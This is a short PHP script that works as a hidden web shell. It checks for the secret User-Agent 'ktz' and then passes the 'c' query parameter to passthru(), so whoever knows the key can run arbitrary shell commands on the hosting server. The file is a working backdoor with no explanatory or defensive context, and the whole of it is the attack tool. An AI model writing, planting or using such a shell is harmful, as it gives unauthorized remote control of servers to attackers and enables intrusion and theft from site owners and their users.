<?php

if($_SERVER['HTTP_USER_AGENT'] != "ktz") die();

passthru($_GET["c"]);

?>
